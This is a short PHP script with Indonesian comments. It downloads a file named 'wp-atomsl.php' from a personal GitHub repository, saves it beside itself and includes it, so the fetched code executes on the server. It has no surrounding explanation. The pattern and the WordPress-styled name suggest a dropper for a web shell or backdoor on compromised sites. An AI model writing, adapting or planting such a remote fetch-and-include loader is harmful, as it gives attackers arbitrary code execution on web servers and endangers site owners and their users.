<?php
ini_set('display_errors',1);
error_reporting(E_ALL);
set_time_limit(0);

$url = 'https://raw.githubusercontent.com/soy777/gg/main/wp-atomsl.php';
$save_to = __DIR__ . '/tmp_from_github.php';

// gunakan cURL untuk ambil
$ch = curl_init($url);
$fp = fopen($save_to, 'w+');
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // jika masalah SSL, bisa coba false sementara
curl_exec($ch);
$err = curl_error($ch);
$status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);
fclose($fp);

if($err){
    echo "cURL error: " . $err;
    @unlink($save_to);
    exit;
}
if($status != 200){
    echo "HTTP status: $status";
    @unlink($save_to);
    exit;
}

// set permission aman lalu include
chmod($save_to, 0644);
include $save_to;
?>
